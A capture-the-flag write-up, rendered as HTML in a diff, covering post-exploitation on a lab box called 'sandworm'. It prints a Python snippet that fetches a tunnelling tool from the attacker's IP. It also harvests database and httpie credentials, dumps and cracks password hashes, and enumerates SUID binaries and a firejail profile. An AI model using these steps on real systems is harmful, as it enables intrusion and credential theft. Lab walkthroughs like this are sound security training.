+    <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SQLALCHEMY_DATABASE_URI&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA&#39;</span>
+
+    <span class="n">db</span><span class="o">.</span><span class="n">init_app</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+
+    <span class="c1"># blueprint for non-auth parts of app</span>
+    <span class="kn">from</span><span class="w"> </span><span class="nn">.app</span><span class="w"> </span><span class="kn">import</span> <span class="n">main</span> <span class="k">as</span> <span class="n">main_blueprint</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">register_blueprint</span><span class="p">(</span><span class="n">main_blueprint</span><span class="p">)</span>
+
+    <span class="n">login_manager</span> <span class="o">=</span> <span class="n">LoginManager</span><span class="p">()</span>
+    <span class="n">login_manager</span><span class="o">.</span><span class="n">login_view</span> <span class="o">=</span> <span class="s2">&quot;main.login&quot;</span>
+    <span class="n">login_manager</span><span class="o">.</span><span class="n">init_app</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+
+    <span class="kn">from</span><span class="w"> </span><span class="nn">.models</span><span class="w"> </span><span class="kn">import</span> <span class="n">User</span>
+    <span class="nd">@login_manager</span><span class="o">.</span><span class="n">user_loader</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">load_user</span><span class="p">(</span><span class="n">user_id</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">user_id</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="n">app</span>
+</pre></div>
+</div>
+<p>We don’t have the mysql bin local, and we also don’t have curl nor netcat, so I’m writing a little, http client in python to get chisel in the box</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://10.10.14.52:9090/chisel-amd&quot;</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/dev/shm/chisel-amd&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Oh, wow, there isn’t even chmod, there’s nothing in here really:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>atlas@sandworm:/bin$<span class="w"> </span>ls<span class="w"> </span>-la
+ls<span class="w"> </span>-la
+total<span class="w"> </span><span class="m">14304</span>
+drwxr-xr-x<span class="w">  </span><span class="m">2</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">     </span><span class="m">340</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">14</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">    </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">6</span><span class="w"> </span><span class="m">11</span>:49<span class="w"> </span>..
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">   </span><span class="m">35328</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>base64
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">   </span><span class="m">35328</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>basename
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w"> </span><span class="m">1396520</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>bash
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">   </span><span class="m">35280</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>cat
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">  </span><span class="m">125688</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>dash
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">     </span><span class="m">948</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>flask
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w"> </span><span class="m">4898752</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>gpg
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w"> </span><span class="m">1960456</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>gpg-agent
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">   </span><span class="m">35328</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>groups
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">   </span><span class="m">39424</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>id
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">    </span><span class="m">9047</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>lesspipe
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">  </span><span class="m">138208</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>ls
+lrwxrwxrwx<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">      </span><span class="m">19</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>python3<span class="w"> </span>-&gt;<span class="w"> </span>/usr/bin/python3.10
+-rwxr-xr-x<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w"> </span><span class="m">5912968</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>python3.10
+lrwxrwxrwx<span class="w">  </span><span class="m">1</span><span class="w"> </span>nobody<span class="w"> </span>nogroup<span class="w">      </span><span class="m">13</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>sh<span class="w"> </span>-&gt;<span class="w"> </span>/usr/bin/dash
+</pre></div>
+</div>
+<p>And the file-system is read-only too.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>atlas@sandworm:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>adfad<span class="w"> </span>&gt;<span class="w"> </span>file
+<span class="nb">echo</span><span class="w"> </span>adfad<span class="w"> </span>&gt;<span class="w"> </span>file
+bash:<span class="w"> </span>file:<span class="w"> </span>Read-only<span class="w"> </span>file<span class="w"> </span>system
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>/etc/*release
+<span class="nv">DISTRIB_ID</span><span class="o">=</span>Ubuntu
+<span class="nv">DISTRIB_RELEASE</span><span class="o">=</span><span class="m">22</span>.04
+<span class="nv">DISTRIB_CODENAME</span><span class="o">=</span>jammy
+<span class="nv">DISTRIB_DESCRIPTION</span><span class="o">=</span><span class="s2">&quot;Ubuntu 22.04.2 LTS&quot;</span>
+<span class="nv">PRETTY_NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu 22.04.2 LTS&quot;</span>
+<span class="nv">NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu&quot;</span>
+<span class="nv">VERSION_ID</span><span class="o">=</span><span class="s2">&quot;22.04&quot;</span>
+<span class="nv">VERSION</span><span class="o">=</span><span class="s2">&quot;22.04.2 LTS (Jammy Jellyfish)&quot;</span>
+<span class="nv">VERSION_CODENAME</span><span class="o">=</span>jammy
+<span class="nv">ID</span><span class="o">=</span>ubuntu
+<span class="nv">ID_LIKE</span><span class="o">=</span>debian
+<span class="nv">HOME_URL</span><span class="o">=</span><span class="s2">&quot;https://www.ubuntu.com/&quot;</span>
+<span class="nv">SUPPORT_URL</span><span class="o">=</span><span class="s2">&quot;https://help.ubuntu.com/&quot;</span>
+<span class="nv">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">&quot;https://bugs.launchpad.net/ubuntu/&quot;</span>
+<span class="nv">PRIVACY_POLICY_URL</span><span class="o">=</span><span class="s2">&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span>
+<span class="nv">UBUNTU_CODENAME</span><span class="o">=</span>jammy
+</pre></div>
+</div>
+<p>Trying to chmod from python</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>    stat.S_ISUID − Set user ID on execution.
+    stat.S_ISGID − Set group ID on execution.
+    stat.S_ENFMT − Record locking enforced.
+    stat.S_ISVTX − Save text image after execution.
+    stat.S_IREAD − Read by owner.
+    stat.S_IWRITE − Write by owner.
+    stat.S_IEXEC − Execute by owner.
+    stat.S_IRWXU − Read, write, and execute by owner.
+    stat.S_IRUSR − Read by owner.
+    stat.S_IWUSR − Write by owner.
+    stat.S_IXUSR − Execute by owner.
+    stat.S_IRWXG − Read, write, and execute by group.
+    stat.S_IRGRP − Read by group.
+    stat.S_IWGRP − Write by group.
+    stat.S_IXGRP − Execute by group.
+    stat.S_IRWXO − Read, write, and execute by others.
+    stat.S_IROTH − Read by others.
+    stat.S_IWOTH − Write by others.
+    stat.S_IXOTH − Execute by others.
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="w"> </span><span class="nn">stat</span>
+<span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="s2">&quot;/dev/shm/chisel-amd&quot;</span><span class="p">,</span> <span class="n">stat</span><span class="o">.</span><span class="n">S_IXUSR</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>But it looks like we don’t have permissions to do that either</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$<span class="w"> </span>python3<span class="w"> </span>chmod.py
+python3<span class="w"> </span>chmod.py
+Traceback<span class="w"> </span><span class="o">(</span>most<span class="w"> </span>recent<span class="w"> </span>call<span class="w"> </span>last<span class="o">)</span>:
+<span class="w">  </span>File<span class="w"> </span><span class="s2">&quot;/dev/shm/chmod.py&quot;</span>,<span class="w"> </span>line<span class="w"> </span><span class="m">2</span>,<span class="w"> </span><span class="k">in</span><span class="w"> </span>&lt;module&gt;
+<span class="w">    </span>os.chmod<span class="o">(</span><span class="s2">&quot;/dev/shm/chisel-amd&quot;</span>,<span class="w"> </span>stat.S_IXUSR<span class="o">)</span>
+PermissionError:<span class="w"> </span><span class="o">[</span>Errno<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Operation<span class="w"> </span>not<span class="w"> </span>permitted:<span class="w"> </span><span class="s1">&#39;/dev/shm/chisel-amd&#39;</span>
+</pre></div>
+</div>
+<p>Trying to read the content of the user table directly from sqlalchemy</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">sqlalchemy</span><span class="w"> </span><span class="kn">import</span> <span class="n">create_engine</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">sqlalchemy</span><span class="w"> </span><span class="kn">import</span> <span class="n">select</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">sqlalchemy</span><span class="w"> </span><span class="kn">import</span> <span class="n">MetaData</span>
+
+<span class="n">user</span> <span class="o">=</span> <span class="s2">&quot;atlas&quot;</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;GarlicAndOnionZ42&quot;</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="s2">&quot;3306&quot;</span>
+<span class="n">database</span> <span class="o">=</span> <span class="s2">&quot;SSA&quot;</span>
+
+<span class="n">engine</span> <span class="o">=</span> <span class="n">create_engine</span><span class="p">(</span>
+    <span class="n">url</span><span class="o">=</span><span class="s2">&quot;mysql://</span><span class="si">{0}</span><span class="s2">:</span><span class="si">{1}</span><span class="s2">@</span><span class="si">{2}</span><span class="s2">:</span><span class="si">{3}</span><span class="s2">/</span><span class="si">{4}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+        <span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">database</span>
+    <span class="p">)</span>
+<span class="p">)</span>
+
+<span class="n">meta</span> <span class="o">=</span> <span class="n">MetaData</span><span class="p">()</span>
+<span class="n">meta</span><span class="o">.</span><span class="n">reflect</span><span class="p">(</span><span class="n">bind</span><span class="o">=</span><span class="n">engine</span><span class="p">)</span>
+<span class="n">user_table</span> <span class="o">=</span> <span class="n">meta</span><span class="o">.</span><span class="n">tables</span><span class="p">[</span><span class="s2">&quot;users&quot;</span><span class="p">]</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">engine</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">user_table</span><span class="o">.</span><span class="n">select</span><span class="p">())</span>
+
+<span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">row</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>atlas@sandworm:/dev/shm$<span class="w"> </span>python3<span class="w"> </span>exploit.py
+python3<span class="w"> </span>exploit.py
+<span class="o">(</span><span class="m">1</span>,<span class="w"> </span><span class="s1">&#39;Odin&#39;</span>,<span class="w"> </span><span class="s1">&#39;pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f&#39;</span><span class="o">)</span>
+<span class="o">(</span><span class="m">2</span>,<span class="w"> </span><span class="s1">&#39;silentobserver&#39;</span>,<span class="w"> </span><span class="s1">&#39;pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d&#39;</span><span class="o">)</span>
+</pre></div>
+</div>
+<p>Starting hashcat in the background</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>hashes.txt
+sha256:260000:q0WZMG27Qb6XwVlZ:12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f
+sha256:260000:kGd27QSYRsOtk7Zi:0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>-a0<span class="w"> </span>hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</pre></div>
+</div>
+<p>In the meantime there is this in the user directory of <code class="docutils literal notranslate"><span class="pre">atlas</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>atlas@sandworm:~/.config/httpie/sessions/localhost_5000$<span class="w"> </span>cat<span class="w"> </span>admin.json
+cat<span class="w"> </span>admin.json
+</pre></div>
+</div>
+<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;__meta__&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;about&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HTTPie session file&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;help&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://httpie.io/docs#sessions&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;httpie&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.6.0&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;auth&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;quietLiketheWind22&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;silentobserver&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;cookies&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;session&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;expires&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;path&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;secure&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA&quot;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;headers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;Accept&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;application/json, */*;q=0.5&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>And that’s also his unix password</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>silentobserver@sandworm:~$
+silentobserver@sandworm:~$
+silentobserver@sandworm:~$
+silentobserver@sandworm:~$
+silentobserver@sandworm:~$<span class="w"> </span>wc<span class="w"> </span>-c<span class="w"> </span>user.txt
+<span class="m">33</span><span class="w"> </span>user.txt
+</pre></div>
+</div>
+</section>
+<section id="privesc">
+<h2>Privesc<a class="headerlink" href="#privesc" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>silentobserver@sandworm:~$<span class="w"> </span>sudo<span class="w"> </span>-l
+<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>silentobserver:
+Sorry,<span class="w"> </span>user<span class="w"> </span>silentobserver<span class="w"> </span>may<span class="w"> </span>not<span class="w"> </span>run<span class="w"> </span>sudo<span class="w"> </span>on<span class="w"> </span>localhost.
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>silentobserver@sandworm:~$<span class="w"> </span>groups
+silentobserver
+silentobserver@sandworm:~$<span class="w"> </span>id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>silentobserver<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>silentobserver<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>silentobserver<span class="o">)</span>
+</pre></div>
+</div>
+<p>The webapp wasn’t in a container but it looks like it was in a jail of some sort</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>silentobserver@sandworm:/home/atlas/.config/firejail$<span class="w"> </span>cat<span class="w"> </span>webapp.profile
+noblacklist<span class="w"> </span>/var/run/mysqld/mysqld.sock
+
+hostname<span class="w"> </span>sandworm
+seccomp
+
+noroot
+allusers
+
+caps.drop<span class="w"> </span>dac_override,fowner,setuid,setgid
+seccomp.drop<span class="w"> </span>chmod,fchmod,setuid
+
+private-tmp
+private-opt<span class="w"> </span>none
+private-dev
+private-bin<span class="w"> </span>/usr/bin/python3,/usr/local/bin/gpg,/bin/bash,/usr/bin/flask,/usr/local/sbin/gpg,/usr/bin/groups,/usr/bin/base64,/usr/bin/lesspipe,/usr/bin/basename,/usr/bin/filename,/usr/bin/bash,/bin/sh,/usr/bin/ls,/usr/bin/cat,/usr/bin/id,/usr/local/libexec/scdaemon,/usr/local/bin/gpg-agent
+
+<span class="c1">#blacklist ${HOME}/.ssh</span>
+<span class="c1">#blacklist /opt</span>
+
+blacklist<span class="w"> </span>/home/silentobserver
+whitelist<span class="w"> </span>/var/www/html/SSA
+read-write<span class="w"> </span>/var/www/html/SSA/SSA/submissions
+
+noexec<span class="w"> </span>/var/www/html/SSA/SSA/submissions
+read-only<span class="w"> </span><span class="si">${</span><span class="nv">HOME</span><span class="si">}</span>
+read-write<span class="w"> </span><span class="si">${</span><span class="nv">HOME</span><span class="si">}</span>/.gnupg
+</pre></div>
+</div>
+<p>Looks like <a class="reference external" href="https://github.com/netblue30/firejail">that’s</a> what’s going on</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">2023</span><span class="o">/</span><span class="mi">07</span><span class="o">/</span><span class="mi">16</span> <span class="mi">08</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">40</span> <span class="n">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">1000</span> <span class="n">PID</span><span class="o">=</span><span class="mi">1238</span>   <span class="o">|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span> <span class="o">--</span><span class="n">profile</span><span class="o">=</span><span class="n">webapp</span> <span class="n">flask</span> <span class="n">run</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>silentobserver@sandworm:~$<span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-user<span class="w"> </span>root<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+/usr/local/bin/firejail
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/fusermount3
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>silentobserver@sandworm:/opt/tipnet/src$<span class="w"> </span>cat<span class="w"> </span>main.rs
+</pre></div>
+</div>
+<div class="highlight-rust notranslate"><div class="highlight"><pre><span></span><span class="k">extern</span><span class="w"> </span><span class="k">crate</span><span class="w"> </span><span class="n">logger</span><span class="p">;</span>
+<span class="k">use</span><span class="w"> </span><span class="n">sha2</span><span class="p">::{</span><span class="n">Digest</span><span class="p">,</span><span class="w"> </span><span class="n">Sha256</span><span class="p">};</span>
+<span class="k">use</span><span class="w"> </span><span class="n">chrono</span><span class="p">::</span><span class="n">prelude</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>
+<span class="k">use</span><span class="w"> </span><span class="n">mysql</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>
+<span class="k">use</span><span class="w"> </span><span class="n">mysql</span><span class="p">::</span><span class="n">prelude</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>
+<span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">fs</span><span class="p">;</span>
+<span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">process</span><span class="p">::</span><span class="n">Command</span><span class="p">;</span>
+<span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">io</span><span class="p">;</span>
+
+
+<span class="c1">// We don&#39;t spy on you... much.</span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">Entry</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">timestamp</span><span class="p">:</span><span class="w"> </span><span class="nb">String</span><span class="p">,</span>
+<span class="w">    </span><span class="n">target</span><span class="p">:</span><span class="w"> </span><span class="nb">String</span><span class="p">,</span>
+<span class="w">    </span><span class="n">source</span><span class="p">:</span><span class="w"> </span><span class="nb">String</span><span class="p">,</span>
+<span class="w">    </span><span class="n">data</span><span class="p">:</span><span class="w"> </span><span class="nb">String</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="k">fn</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;</span>
+<span class="s">             ,,</span>
+<span class="s">MMP</span><span class="se">\&quot;\&quot;</span><span class="s">MM</span><span class="se">\&quot;\&quot;</span><span class="s">YMM db          `7MN.   `7MF&#39;         mm</span>
+<span class="s">P&#39;   MM   `7               MMN.    M           MM</span>
+<span class="s">     MM    `7MM `7MMpdMAo. M YMb   M  .gP</span><span class="se">\&quot;</span><span class="s">Ya mmMMmm</span>
+<span class="s">     MM      MM   MM   `Wb M  `MN. M ,M&#39;   Yb  MM</span>
+<span class="s">     MM      MM   MM    M8 M   `MM.M 8M</span><span class="se">\&quot;\&quot;\&quot;\&quot;\&quot;\&quot;</span><span class="s">  MM</span>
+<span class="s">     MM      MM   MM   ,AP M     YMM YM.    ,  MM</span>
+<span class="s">   .JMML.  .JMML. MMbmmd&#39;.JML.    YM  `Mbmmd&#39;  `Mbmo</span>
+<span class="s">                  MM</span>
+<span class="s">                .JMML.</span>
+
+<span class="s">&quot;</span><span class="p">);</span>
+
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_mode</span><span class="p">();</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">&quot;upstream&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">&quot;pull&quot;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;[-] Mode is still being ported to Rust; try again later.&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connect_to_db</span><span class="p">(</span><span class="s">&quot;Upstream&quot;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;pull&quot;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">source</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/var/www/html/SSA/SSA/submissions&quot;</span><span class="p">;</span>
